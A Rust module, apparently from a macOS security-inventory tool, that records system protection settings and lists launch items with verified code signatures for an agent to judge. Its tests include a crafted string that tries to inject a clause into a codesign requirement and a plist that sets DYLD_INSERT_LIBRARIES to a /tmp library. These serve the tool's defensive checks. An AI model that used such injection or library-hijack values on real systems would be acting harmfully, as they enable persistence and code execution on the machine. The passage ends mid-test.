//! This Mac's protections and the programs it starts on its own, for the agent to judge beside
//! the inventory.
//!
//! Two bundle files, under `mac/`:
//!
//! - `mac/settings.json`: System Integrity Protection, Gatekeeper, `FileVault` and the
//!   application firewall, each as the line its tool prints. An issue names one by its key.
//! - `mac/persistence.jsonl`: every launch agent and daemon outside `/System`, one per line,
//!   with the program it starts, the script an interpreter runs, and their code signatures. An
//!   issue names one by the property list's path.
//!
//! Vigil reads signatures itself because a sweep's agent runs no commands. Every tool is called
//! by its absolute path: these checks decide whether a program is trusted, and a `codesign`
//! earlier on the login shell's `PATH` could answer for it.
//!
//! An item's issue is keyed by the item's path and what it runs ([`Item::identity`]): the
//! program's and the script's paths and identities ([`Signature::identity`]), the arguments,
//! the environment, the user and whether it runs at load. A file's identity is its signing team
//! when Apple issued a Developer ID or App Store certificate to that team, and its content
//! otherwise. A dismissed item whose command line changes, or whose program is replaced by one
//! from someone else, is then a new issue, while an update from the same developer keeps the
//! dismissal. The identity is part of every item issue's key, so changing its shape clears
//! every item dismissal once.
//!
//! Not read yet: login items (Background Task Management, readable only with Full Disk
//! Access), cron, kernel and system extensions, and the other persistence locations.
//! `/System/Library/Launch*` is left out because it is on the sealed system volume.

use std::collections::BTreeMap;
use std::fs;
use std::io;
use std::os::unix::fs::MetadataExt as _;
use std::path::Path;
use std::path::PathBuf;

use serde::Deserialize;
use serde::Serialize;
use serde_json::json;

use crate::cancel::Cancel;
use crate::inventory::Inventory;
use crate::inventory::InventoryError;
use crate::inventory::InventorySource;
use crate::inventory::command;
use crate::inventory::command::Output;
use crate::paths;

/// What the host checks found, ready for the Mac's bundle.
#[derive(Debug, Default)]
pub(crate) struct Host {
    /// Bundle files by path: `mac/settings.json` and `mac/persistence.jsonl`.
    pub(crate) files: Vec<(String, String)>,
    /// The keys of `mac/settings.json`, which an issue may name.
    pub(crate) settings: Vec<String>,
    /// Each launch item's path, which an issue may name, and the identity of what it runs,
    /// which keys that issue (see the module docs).
    pub(crate) items: BTreeMap<String, String>,
}

/// The settings read, by key: the tool and its arguments. Each prints one line of state.
const POSTURE: [(&str, &str, &[&str]); 4] = [
    (
        "system_integrity_protection",
        "/usr/bin/csrutil",
        &["status"],
    ),
    ("gatekeeper", "/usr/sbin/spctl", &["--status"]),
    ("filevault", "/usr/bin/fdesetup", &["status"]),
    (
        "firewall",
        "/usr/libexec/ApplicationFirewall/socketfilterfw",
        &["--getglobalstate"],
    ),
];

/// The folders launchd reads jobs from, outside the sealed system volume. The user's own
/// `~/Library/LaunchAgents` is added at run time.
const LAUNCH_FOLDERS: [(ItemKind, &str); 2] = [
    (ItemKind::LaunchDaemon, "/Library/LaunchDaemons"),
    (ItemKind::LaunchAgent, "/Library/LaunchAgents"),
];

/// Where launchd looks for a program named without a folder: its default `PATH`, per
/// launchd.plist(5) (`ProgramArguments`, searched with execvp(3)).
const LAUNCHD_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];

/// Programs that run a file named in their arguments, by name without a trailing version
/// (`python3.12` is `python`). For these the script is checked too, since the interpreter is
/// Apple's whatever the script does. `env` is here because it runs the rest of its arguments.
const INTERPRETERS: [&str; 15] = [
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "perl",
    "python",
    "python3",
    "ruby",
    "osascript",
    "node",
    "env",
    "pwsh",
];

/// Options after which an interpreter runs code given on the command line rather than a file:
/// `sh -c`, `perl -e`, `osascript -e`, `node --eval`. A short-option cluster ending in `c`
/// (`bash -lc`) counts too. The agent judges the inline code from `arguments`.
const INLINE_CODE: [&str; 4] = ["-c", "-e", "-E", "--eval"];

/// Environment variables whose values the agent sees: `DYLD_` ones make the program load other
/// code, and `PATH` can change which program a bare name finds.
fn shows_value(name: &str) -> bool {
    name.starts_with("DYLD_") || name == "PATH"
}

/// The largest property list read, in bytes. Arbitrary: launchd jobs are a few kB, and the
/// limit keeps a planted file from being read whole.
const PLIST_LIMIT: u64 = 1024 * 1024;

const CODESIGN: &str = "/usr/bin/codesign";
const SHASUM: &str = "/usr/bin/shasum";

/// Reads the settings and launch items, recording what failed in `inventory` as problems of
/// [`InventorySource::Posture`] and [`InventorySource::LaunchItems`].
///
/// Runs `codesign` up to six times per file an item runs, and `shasum` for an unsigned one,
/// each with the inventory's time limit. Once `cancel` is set it reads no more items, and
/// records the read as cancelled. The `stat` of each file has no time limit: a program on a
/// network share that does not answer blocks the sweep, as a version manager's folder there
/// does.
pub(crate) fn collect(inventory: &mut Inventory, cancel: &Cancel) -> Host {
    let settings = posture(inventory, cancel);
    let mut folders: Vec<(ItemKind, PathBuf)> = LAUNCH_FOLDERS
        .iter()
        .map(|(kind, folder)| (*kind, PathBuf::from(folder)))
        .collect();
    match std::env::home_dir() {
        Some(home) => folders.push((ItemKind::UserLaunchAgent, home.join("Library/LaunchAgents"))),
        None => inventory.fail(
            InventorySource::LaunchItems,
            InventoryError::Io {
                path: PathBuf::from("~/Library/LaunchAgents"),
                source: io::Error::new(io::ErrorKind::NotFound, "no home folder: set HOME"),
            },
        ),
    }
    let items = launch_items(inventory, &folders, cancel);
    Host::new(&settings, &items)
}

impl Host {
    fn new(settings: &BTreeMap<&str, String>, items: &[Item]) -> Self {
        let settings_json =
            serde_json::to_string_pretty(settings).expect("a map of strings serializes");
        let mut lines = String::new();
        for item in items {
            let line = serde_json::to_string(item)
                .expect("an item holds only strings, booleans, and lists and maps of them");
            lines.push_str(&line);
            lines.push('\n');
        }
        Self {
            files: vec![
                ("mac/settings.json".to_owned(), settings_json),
                ("mac/persistence.jsonl".to_owned(), lines),
            ],
            settings: settings.keys().map(|key| (*key).to_owned()).collect(),
            items: items
                .iter()
                .map(|item| (item.path.clone(), item.identity()))
                .collect(),
        }
    }
}

/// The state each [`POSTURE`] tool prints, by key. A tool that cannot run is left out and
/// recorded, so the agent never reads a guess.
fn posture(inventory: &mut Inventory, cancel: &Cancel) -> BTreeMap<&'static str, String> {
    let mut settings = BTreeMap::new();
    for (key, program, args) in POSTURE {
        match command::run_any_status(program, args, cancel) {
            // Kept whatever the exit status: the printed state is the answer, and a tool that
            // reports an error prints that instead, which the agent reads as such.
            Ok(Some(output)) => {
                let text = format!("{} {}", output.stdout.trim(), output.stderr.trim());
                settings.insert(key, text.trim().to_owned());
            }
            Ok(None) => inventory.missing(program),
            Err(e) => inventory.fail(InventorySource::Posture, e),
        }
    }
    settings
}

/// Where a launch item was found, which decides who it runs as.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum ItemKind {
    /// `/Library/LaunchDaemons`: runs as root unless it names a `UserName`.
    LaunchDaemon,
    /// `/Library/LaunchAgents`: runs as every user who logs in.
    LaunchAgent,
    /// `~/Library/LaunchAgents`: runs as this user.
    UserLaunchAgent,
}

/// One launch item, as the agent reads it.
#[derive(Debug, Serialize)]
struct Item {
    /// The property list's path, which an issue names. Text, with any byte that is not UTF-8
    /// replaced, so a planted file with such a name is still listed.
    path: String,
    kind: ItemKind,
    /// Why the property list could not be read, when it could not; the fields below are then
    /// empty, except `stamp`.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// The size and modification time of a property list that could not be read, so that a
    /// dismissed one shows again once it changes.
    #[serde(skip_serializing_if = "Option::is_none")]
    stamp: Option<String>,
    label: Option<String>,
    /// The program launchd starts, from `Program` or else the first of `ProgramArguments`.
    program: Option<Program>,
    /// `ProgramArguments`, the program's own name first. Kept whole, although an argument can
    /// hold a token: the command line is what the agent judges (`sh -c`, a download piped to a
    /// shell), and the sweep's agent cannot send anything off this Mac.
    arguments: Vec<String>,
    /// The script an interpreter in [`INTERPRETERS`] runs: its first argument that is an
    /// absolute path, unless inline code comes first.
    script: Option<Program>,
    run_at_load: bool,
    /// Whether `KeepAlive` is set: `true`, or conditions under which launchd restarts it.
    keep_alive: bool,
    /// The property list's own `Disabled` key. launchd's override database
    /// (`launchctl print-disabled`) is not read, so an item shown enabled may be turned off.
    disabled: bool,
    user_name: Option<String>,
    /// The names of the environment variables it sets, with values only where
    /// [`shows_value`] says. Other values can hold tokens, and their names are enough to judge
    /// them.
    environment: BTreeMap<String, Option<String>>,
}

/// A file an item runs, with its signature.
#[derive(Debug, Serialize)]
struct Program {
    path: PathBuf,
    signature: Signature,
}

impl Item {
    /// An item whose property list could not be read.
    fn unread(kind: ItemKind, path: String, error: String, stamp: Option<String>) -> Self {
        Self {
            path,
            kind,
            error: Some(error),
            stamp,
            label: None,
            program: None,
            arguments: Vec::new(),
            script: None,
            run_at_load: false,
            keep_alive: false,
            disabled: false,
            user_name: None,
            environment: BTreeMap::new(),
        }
    }

    /// What the item runs, as one key part (see the module docs). JSON, so no two different
    /// items can join into the same text.
    fn identity(&self) -> String {
        let file = |program: &Option<Program>| {
            program
                .as_ref()
                .map(|p| json!([p.path, p.signature.identity()]))
        };
        json!({
            "program": file(&self.program),
            "script": file(&self.script),
            "arguments": self.arguments,
            "environment": self.environment,
            "user_name": self.user_name,
            "run_at_load": self.run_at_load,
            "unread": self.stamp,
        })
        .to_string()
    }
}

/// The keys of a launchd job that the agent reads; the rest are ignored.
#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct Job {
    label: Option<String>,
    program: Option<String>,
    program_arguments: Option<Vec<String>>,
    working_directory: Option<String>,
    run_at_load: Option<bool>,
    keep_alive: Option<plist::Value>,
    disabled: Option<bool>,
    user_name: Option<String>,
    environment_variables: Option<BTreeMap<String, plist::Value>>,
}

/// Reads every item in `folders`. A folder that does not exist has none; one that cannot be
/// listed is recorded as a problem of [`InventorySource::LaunchItems`], a failure unless
/// permission was denied (see [`InventoryError::is_failure`]). A signature check that could not
/// run is a failure too, and its item is kept with the program `unreadable`, so the agent still
/// sees it.
fn launch_items(
    inventory: &mut Inventory,
    folders: &[(ItemKind, PathBuf)],
    cancel: &Cancel,
) -> Vec<Item> {
    let mut items = Vec::new();
    for (kind, folder) in folders {
        let paths = match list(folder) {
            Ok(paths) => paths,
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(source) => {
                let path = folder.clone();
                inventory.fail(
                    InventorySource::LaunchItems,
                    InventoryError::Io { path, source },
                );
                continue;
            }
        };
        for path in paths {
            if cancel.is_cancelled() {
                let what = "reading launch items".to_owned();
                inventory.fail(
                    InventorySource::LaunchItems,
                    InventoryError::Cancelled { what },
                );
                return items;
            }
            let mut failures = Vec::new();
            items.push(read_item(*kind, &path, cancel, &mut failures));
            for e in failures {
                inventory.fail(InventorySource::LaunchItems, e);
            }
        }
    }
    items
}

/// The entries of `folder`, sorted. Hidden ones are kept, since launchd loads them too; only
/// Finder's `.DS_Store` is skipped.
fn list(folder: &Path) -> io::Result<Vec<PathBuf>> {
    let mut paths = Vec::new();
    for entry in fs::read_dir(folder)? {
        let entry = entry?;
        if entry.file_name() != ".DS_Store" {
            paths.push(entry.path());
        }
    }
    paths.sort();
    Ok(paths)
}

/// Reads one item and checks what it runs. A property list that cannot be read is an item with
/// its `error`; a check that cannot run is pushed to `failures`.
fn read_item(
    kind: ItemKind,
    path: &Path,
    cancel: &Cancel,
    failures: &mut Vec<InventoryError>,
) -> Item {
    let shown_path = path.to_string_lossy().into_owned();
    let job = match read_job(path) {
        Ok(job) => job,
        Err(error) => {
            // Without following a link, so a link cannot point the stamp elsewhere.
            let stamp = fs::symlink_metadata(path).ok().map(|m| stamp(&m));
            return Item::unread(kind, shown_path, error, stamp);
        }
    };
    let arguments = job.program_arguments.unwrap_or_default();
    let working_directory = job.working_directory.as_deref();
    let program = job
        .program
        .as_deref()
        .or(arguments.first().map(String::as_str))
        .map(|name| checked(resolve(name, working_directory), cancel, failures));
    let script = program
        .as_ref()
        .and_then(|program| script(&program.path, &arguments))
        .map(|path| checked(path, cancel, failures));
    let environment = job
        .environment_variables
        .unwrap_or_default()
        .into_iter()
        .map(|(name, value)| {
            let shown =
                shows_value(&name).then(|| value.as_string().unwrap_or("(not text)").to_owned());
            (name, shown)
        })
        .collect();
    Item {
        path: shown_path,
        kind,
        error: None,
        stamp: None,
        label: job.label,
        program,
        arguments,
        script,
        run_at_load: job.run_at_load.unwrap_or(false),
        keep_alive: job
            .keep_alive
            .is_some_and(|value| value.as_boolean() != Some(false)),
        disabled: job.disabled.unwrap_or(false),
        user_name: job.user_name,
        environment,
    }
}

/// Parses the property list at `path`, or says why it cannot be read. A link or anything but a
/// regular file is refused by the open itself, so a file swapped for a FIFO cannot block the
/// read; the agent is told to report such an item.
fn read_job(path: &Path) -> Result<Job, String> {
    let bytes = paths::read_capped(path, PLIST_LIMIT + 1).map_err(|e| match e.kind() {
        io::ErrorKind::InvalidInput => "not a regular file (a link, a folder or a FIFO)".to_owned(),
        _ => format!("cannot read it: {e}"),
    })?;
    if bytes.len() as u64 > PLIST_LIMIT {
        return Err(format!("more than the {PLIST_LIMIT} bytes read"));
    }
    plist::from_bytes(&bytes).map_err(|e| format!("not a launchd property list: {e}"))
}

/// The file launchd runs for `name`: an absolute path as it is; a relative one under the job's
/// `WorkingDirectory` when that is absolute; a bare name at its first match on launchd's
/// `PATH`. Anything else is returned as it is and checked as unreadable or missing.
fn resolve(name: &str, working_directory: Option<&str>) -> PathBuf {
    if name.starts_with('/') {
        return PathBuf::from(name);
    }
    if name.contains('/') {
        return match working_directory {
            Some(folder) if folder.starts_with('/') => Path::new(folder).join(name),
            _ => PathBuf::from(name),
        };
    }
    LAUNCHD_PATH
        .iter()
        .map(|folder| Path::new(folder).join(name))
        .find(|candidate| candidate.is_file())
        .unwrap_or_else(|| PathBuf::from(name))
}

/// The script `program` runs, when it is an interpreter: the first argument after the
/// program's own name that is an absolute path, unless an [`INLINE_CODE`] option comes first.
/// Options and their values before it are skipped (`python3 -u /x.py`, `osascript -l
/// JavaScript /x.js`, `env python3 /x.py`).
fn script(program: &Path, arguments: &[String]) -> Option<PathBuf> {
    if !is_interpreter(program) {
        return None;
    }
    for argument in arguments.iter().skip(1) {
        let cluster_ending_in_c = argument.len() > 2
            && argument.starts_with('-')
            && !argument.starts_with("--")
            && argument.ends_with('c');
        if INLINE_CODE.contains(&argument.as_str()) || cluster_ending_in_c {
            return None;
        }
        if argument.starts_with('/') {
            return Some(PathBuf::from(argument));
        }
    }
    None
}

fn is_interpreter(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| {
            let unversioned = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
            INTERPRETERS.contains(&name) || INTERPRETERS.contains(&unversioned)
        })
}

/// `path` with its signature. A check that cannot run leaves the file `unreadable` and goes to
/// `failures`.
fn checked(path: PathBuf, cancel: &Cancel, failures: &mut Vec<InventoryError>) -> Program {
    let signature = signature(&path, cancel).unwrap_or_else(|e| {
        let detail = format!("the check could not run: {e}");
        failures.push(e);
        Signature::Unreadable {
            detail,
            stamp: None,
        }
    });
    Program { path, signature }
}

/// A file's code signature, as `codesign` verifies it.
#[derive(Debug, PartialEq, Eq, Serialize)]
#[serde(tag = "status", rename_all = "snake_case")]
enum Signature {
    /// No file at the path: the job fails to start, or starts whatever is put there later.
    Missing,
    /// Not a regular file, a relative path launchd resolves elsewhere, or a file this user
    /// cannot read (an executable with mode `0111` runs, but cannot be read). `stamp` is its
    /// size and modification time when they could be read.
    Unreadable {
        detail: String,
        stamp: Option<String>,
    },
    /// Not signed at all.
    Unsigned { sha256: String },
    /// Signed, but the signature does not verify: the file changed after it was signed.
    Invalid { detail: String, cdhash: String },
    /// Signed by Apple: part of macOS or an Apple app.
    Apple,
    /// Signed with a certificate Apple issued, of the kind in `certificate`, to `team` when the
    /// signature names one (checked by requirement, not taken from the signature's claim).
    AppleIssued {
        certificate: Certificate,
        authority: Option<String>,
        team: Option<String>,
        cdhash: String,
    },
    /// Signed with a certificate Apple did not issue (or not to the team it names), which
    /// Gatekeeper does not trust. Its names are the signer's own claim.
    OtherIssuer {
        authority: Option<String>,
        team: Option<String>,
        cdhash: String,
    },
    /// Signed with no identity, as the linker signs every arm64 build.
    AdHoc { cdhash: String },
}

/// The kind of certificate Apple issued, told apart by the leaf certificate's marker
/// extensions (Apple's object identifiers `1.2.840.113635.100.6.1.13` and `...6.1.9`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum Certificate {
    /// Developer ID Application: the certificate for software shipped outside the App Store.
    DeveloperId,
    /// Mac App Store.
    AppStore,
    /// Any other, such as Apple Development, which every Apple ID can get for free.
    Other,
}

impl Certificate {
    /// The requirement clause that holds only for this kind, after `anchor apple generic`.
    fn clause(self) -> &'static str {
        match self {
            Self::DeveloperId => " and certificate leaf[field.1.2.840.113635.100.6.1.13] exists",
            Self::AppStore => " and certificate leaf[field.1.2.840.113635.100.6.1.9] exists",
            Self::Other => "",
        }
    }

    fn name(self) -> &'static str {
        match self {
            Self::DeveloperId => "developer_id",
            Self::AppStore => "app_store",
            Self::Other => "other",
        }
    }
}

impl Signature {
    /// Who stands behind the file, as part of an item's identity. Only a team that Apple
    /// issued a Developer ID or App Store certificate to survives an update; every other
    /// identity is the file's own (its hash, or its size and modification time when it cannot
    /// be read), since the names in it are the signer's claim. A free Apple Development
    /// certificate is keyed by content too, as anyone can get one.
    fn identity(&self) -> String {
        match self {
            Self::Missing => "missing".to_owned(),
            Self::Unreadable { stamp, .. } => {
                format!("unreadable:{}", stamp.as_deref().unwrap_or("unknown"))
            }
            Self::Unsigned { sha256 } => format!("sha256:{sha256}"),
            Self::Invalid { cdhash, .. } => format!("invalid:{cdhash}"),
            Self::Apple => "apple".to_owned(),
            Self::AppleIssued {
                certificate: certificate @ (Certificate::DeveloperId | Certificate::AppStore),
                team: Some(team),
                ..
            } => format!("{}:{team}", certificate.name()),
            Self::AppleIssued { cdhash, .. }
            | Self::OtherIssuer { cdhash, .. }
            | Self::AdHoc { cdhash } => format!("cdhash:{cdhash}"),
        }
    }
}

/// Checks the signature of the file at `path`: what `codesign -d` shows, whether it
/// verifies, and who issued the certificate. The names `codesign -d` shows are the signer's
/// claim (a self-signed certificate can be called "Software Signing", and claim any team); only
/// a requirement check (`-R=anchor apple`) tests who issued it, and to which team.
fn signature(path: &Path, cancel: &Cancel) -> Result<Signature, InventoryError> {
    // launchd resolves a relative path against the job's `WorkingDirectory`, and a bare name on
    // its `PATH`, which `resolve` already did where it could; Vigil's own folder says nothing
    // about either.
    if !path.is_absolute() {
        if path.components().count() == 1 {
            return Ok(Signature::Missing);
        }
        let detail = "a relative path with no absolute WorkingDirectory; not checked".to_owned();
        return Ok(Signature::Unreadable {
            detail,
            stamp: None,
        });
    }
    let metadata = match fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(Signature::Missing),
        Err(e) => {
            let detail = e.to_string();
            return Ok(Signature::Unreadable {
                detail,
                stamp: None,
            });
        }
    };
    let unreadable = |detail: String| Signature::Unreadable {
        detail,
        stamp: Some(stamp(&metadata)),
    };
    // A FIFO would block `shasum`, and a folder is no program.
    if !metadata.is_file() {
        return Ok(unreadable("not a regular file".to_owned()));
    }
    let Some(file) = path.to_str() else {
        return Ok(unreadable("the path is not UTF-8".to_owned()));
    };

    let shown = tool(CODESIGN, &["-d", "--verbose=4", file], cancel)?;
    if !shown.success {
        if shown.stderr.contains("code object is not signed at all") {
            let sha256 = sha256(file, cancel)?;
            return Ok(Signature::Unsigned { sha256 });
        }
        return Ok(unreadable(first_line(&shown.stderr)));
    }
    let shown = Shown::parse(&shown.stderr);
    // Every signed file has a code directory hash. Without one the output changed shape, and
    // the identities built on it would all be the same, so a dismissal would outlive any
    // replacement.
    let Some(cdhash) = shown.cdhash else {
        return Ok(unreadable("codesign -d printed no CDHash".to_owned()));
    };

    let verified = tool(CODESIGN, &["--verify", "--strict", file], cancel)?;
    if !verified.success {
        let detail = first_line(&verified.stderr);
        return Ok(Signature::Invalid { detail, cdhash });
    }
    if shown.adhoc {
        return Ok(Signature::AdHoc { cdhash });
    }
    if tool(CODESIGN, &["--verify", "-R=anchor apple", file], cancel)?.success {
        return Ok(Signature::Apple);
    }
    let Shown {
        authority, team, ..
    } = shown;
    match apple_certificate(file, team.as_deref(), cancel)? {
        Some(certificate) => Ok(Signature::AppleIssued {
            certificate,
            authority,
            team,
            cdhash,
        }),
        None => Ok(Signature::OtherIssuer {
            authority,
            team,
            cdhash,
        }),
    }
}

/// The kind of certificate Apple issued for the signature of `file`, issued to `team` when the
/// signature names one; `None` when Apple did not issue it, or not to that team.
fn apple_certificate(
    file: &str,
    team: Option<&str>,
    cancel: &Cancel,
) -> Result<Option<Certificate>, InventoryError> {
    let to_team = match team {
        // A team ID is ten letters and digits. Anything else is not put into the requirement,
        // whose language it could otherwise extend, and the team is not bound.
        Some(team) if team.bytes().all(|b| b.is_ascii_alphanumeric()) => {
            format!(" and certificate leaf[subject.OU] = \"{team}\"")
        }
        Some(_) | None => String::new(),
    };
    for certificate in [
        Certificate::DeveloperId,
        Certificate::AppStore,
        Certificate::Other,
    ] {
        let requirement = format!("-R=anchor apple generic{}{to_team}", certificate.clause());
        if tool(CODESIGN, &["--verify", &requirement, file], cancel)?.success {
            return Ok(Some(certificate));
        }
    }
    Ok(None)
}

/// A file's size and modification time, for an identity where its content cannot be read.
fn stamp(metadata: &fs::Metadata) -> String {
    format!(
        "{} bytes, modified {}.{:09}",
        metadata.size(),
        metadata.mtime(),
        metadata.mtime_nsec()
    )
}

/// What `codesign -d --verbose=4` prints on stderr, as far as a signature's identity goes.
#[derive(Debug, Default, PartialEq, Eq)]
struct Shown {
    /// The first `Authority=` line: the leaf certificate's name.
    authority: Option<String>,
    /// `TeamIdentifier=`, unless "not set".
    team: Option<String>,
    cdhash: Option<String>,
    /// Whether it printed `Signature=adhoc`.
    adhoc: bool,
}

impl Shown {
    fn parse(stderr: &str) -> Self {
        let mut shown = Self::default();
        for line in stderr.lines() {
            let Some((name, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim().to_owned();
            match name {
                "Authority" if shown.authority.is_none() => shown.authority = Some(value),
                "TeamIdentifier" if value != "not set" => shown.team = Some(value),
                "CDHash" => shown.cdhash = Some(value),
                "Signature" => shown.adhoc = value == "adhoc",
                _ => {}
            }
        }
        shown
    }
}

/// The SHA-256 of `file`, in hex.
fn sha256(file: &str, cancel: &Cancel) -> Result<String, InventoryError> {
    let output = tool(SHASUM, &["-a", "256", "--", file], cancel)?;
    let digest = output.stdout.split_whitespace().next().unwrap_or_default();
    if output.success && digest.len() == 64 && digest.bytes().all(|b| b.is_ascii_hexdigit()) {
        Ok(digest.to_owned())
    } else {
        Err(InventoryError::Command {
            command: output.command,
            detail: output.detail,
        })
    }
}

/// Runs a system tool that must be there: one that is not is an error, not a tool to skip.
fn tool(program: &str, args: &[&str], cancel: &Cancel) -> Result<Output, InventoryError> {
    command::run_any_status(program, args, cancel)?.ok_or_else(|| InventoryError::Spawn {
        command: program.to_owned(),
        source: io::Error::new(io::ErrorKind::NotFound, "not found; it ships with macOS"),
    })
}

fn first_line(text: &str) -> String {
    text.lines().next().unwrap_or_default().trim().to_owned()
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt as _;

    use super::*;

    /// `codesign -d --verbose=4` of a Developer ID helper and of an ad-hoc build, trimmed to
    /// the lines read.
    const DEVELOPER_ID: &str = "Executable=/Library/PrivilegedHelperTools/com.docker.vmnetd
Identifier=com.docker.vmnetd
CDHash=0123abcd
Authority=Developer ID Application: Docker Inc (9BNSXJN65R)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=9BNSXJN65R
";
    const AD_HOC: &str = "Identifier=hippius_mem-1057e8020cc77b7d
CDHash=967e47372e37cc02d67c5f3dfe1efdb62c719c67
Signature=adhoc
TeamIdentifier=not set
";

    #[test]
    fn display_gives_the_leaf_authority_team_and_hash() {
        assert_eq!(
            Shown::parse(DEVELOPER_ID),
            Shown {
                authority: Some("Developer ID Application: Docker Inc (9BNSXJN65R)".to_owned()),
                team: Some("9BNSXJN65R".to_owned()),
                cdhash: Some("0123abcd".to_owned()),
                adhoc: false,
            }
        );
        assert_eq!(
            Shown::parse(AD_HOC),
            Shown {
                authority: None,
                team: None,
                cdhash: Some("967e47372e37cc02d67c5f3dfe1efdb62c719c67".to_owned()),
                adhoc: true,
            }
        );
    }

    #[test]
    fn signatures_of_real_files() {
        let tmp = tempfile::tempdir().unwrap();
        let cancel = Cancel::new();

        assert_eq!(
            signature(Path::new("/bin/ls"), &cancel).unwrap(),
            Signature::Apple
        );
        assert_eq!(
            signature(&tmp.path().join("gone"), &cancel).unwrap(),
            Signature::Missing
        );
        assert!(matches!(
            signature(tmp.path(), &cancel).unwrap(),
            Signature::Unreadable { stamp: Some(_), .. }
        ));

        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        assert_eq!(
            signature(&script, &cancel).unwrap(),
            Signature::Unsigned {
                sha256: "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03"
                    .to_owned()
            }
        );

        // An executable that cannot be read still runs; it is keyed by its size and time.
        fs::set_permissions(&script, fs::Permissions::from_mode(0o111)).unwrap();
        let hidden = signature(&script, &cancel).unwrap();
        fs::set_permissions(&script, fs::Permissions::from_mode(0o644)).unwrap();
        assert!(
            matches!(&hidden, Signature::Unreadable { stamp: Some(_), .. }),
            "{hidden:?}"
        );
        assert!(hidden.identity().starts_with("unreadable:6 bytes"));

        // A copy of an Apple binary keeps its signature, until a byte of its code changes.
        let copy = tmp.path().join("ls");
        let mut bytes = fs::read("/bin/ls").unwrap();
        fs::write(&copy, &bytes).unwrap();
        assert_eq!(signature(&copy, &cancel).unwrap(), Signature::Apple);
        let middle = bytes.len() / 2;
        bytes[middle] ^= 0xff;
        fs::write(&copy, &bytes).unwrap();
        let broken = signature(&copy, &cancel).unwrap();
        assert!(
            matches!(&broken, Signature::Invalid { cdhash, .. } if !cdhash.is_empty()),
            "{broken:?}"
        );
    }

    #[test]
    fn a_requirement_never_takes_a_claimed_team_that_is_not_a_team_id() {
        // `/bin/ls` is Apple's own, so no requirement for a team holds; a crafted team that
        // tried to close the quote and add a clause is not put into the requirement at all.
        let cancel = Cancel::new();
        assert_eq!(
            apple_certificate("/bin/ls", Some("X\" or anchor apple or \"Y"), &cancel).unwrap(),
            Some(Certificate::Other),
            "the team is dropped, so only `anchor apple generic` is checked"
        );
        assert_eq!(
            apple_certificate("/bin/ls", Some("AAAAAAAAAA"), &cancel).unwrap(),
            None
        );
    }

    #[test]
    fn identities_follow_a_verified_team_or_the_content() {
        let issued = |certificate, team: &str, cdhash: &str| Signature::AppleIssued {
            certificate,
            authority: None,
            team: Some(team.to_owned()),
            cdhash: cdhash.to_owned(),
        };
        let developer_id = |team, cdhash| issued(Certificate::DeveloperId, team, cdhash);
        // A Developer ID update from the same team keeps the identity; another team does not.
        assert_eq!(
            developer_id("T1", "a").identity(),
            developer_id("T1", "b").identity()
        );
        assert_ne!(
            developer_id("T1", "a").identity(),
            developer_id("T2", "a").identity()
        );
        // A free development certificate is keyed by content, like a self-signed one.
        let development = |cdhash| issued(Certificate::Other, "T1", cdhash);
        assert_ne!(development("a").identity(), development("b").identity());
        let other = |cdhash: &str| Signature::OtherIssuer {
            authority: None,
            team: Some("T1".to_owned()),
            cdhash: cdhash.to_owned(),
        };
        assert_ne!(other("a").identity(), other("b").identity());
        assert_ne!(other("a").identity(), developer_id("T1", "a").identity());

        let unsigned = |sha256: &str| Signature::Unsigned {
            sha256: sha256.to_owned(),
        };
        assert_ne!(unsigned("a").identity(), unsigned("b").identity());
        let invalid = |cdhash: &str| Signature::Invalid {
            detail: String::new(),
            cdhash: cdhash.to_owned(),
        };
        assert_ne!(invalid("a").identity(), invalid("b").identity());
        assert_ne!(Signature::Missing.identity(), Signature::Apple.identity());
    }

    /// Reads one item, whose checks must all run.
    fn read(kind: ItemKind, path: &Path) -> Item {
        let mut failures = Vec::new();
        let item = read_item(kind, path, &Cancel::new(), &mut failures);
        assert!(failures.is_empty(), "{failures:?}");
        item
    }

    fn plist(dir: &Path, name: &str, body: &str) -> PathBuf {
        let path = dir.join(name);
        let text = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>{body}\
             </dict></plist>\n"
        );
        fs::write(&path, text).unwrap();
        path
    }

    /// A job running `arguments`, as `<string>` elements.
    fn job(dir: &Path, name: &str, arguments: &[&str], extra: &str) -> Item {
        let strings = arguments.join("</string><string>");
        let strings = format!("<string>{strings}</string>");
        let body = format!("<key>ProgramArguments</key><array>{strings}</array>{extra}");
        read(ItemKind::LaunchDaemon, &plist(dir, name, &body))
    }

    #[test]
    fn an_item_names_its_program_script_and_shown_values_only() {
        let tmp = tempfile::tempdir().unwrap();
        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        let extra = "<key>Label</key><string>com.example.runner</string>\
             <key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>\
             <key>EnvironmentVariables</key><dict>\
             <key>API_TOKEN</key><string>secret</string>\
             <key>PATH</key><string>/tmp/bin:/usr/bin</string>\
             <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/x.dylib</string></dict>";
        let item = job(
            tmp.path(),
            "runner.plist",
            &["sh", script.to_str().unwrap()],
            extra,
        );

        assert_eq!(item.label.as_deref(), Some("com.example.runner"));
        let program = item.program.as_ref().unwrap();
        assert_eq!(program.path, Path::new("/bin/sh"));
        assert_eq!(program.signature, Signature::Apple);
        let ran = item.script.as_ref().unwrap();
        assert_eq!(ran.path, script);
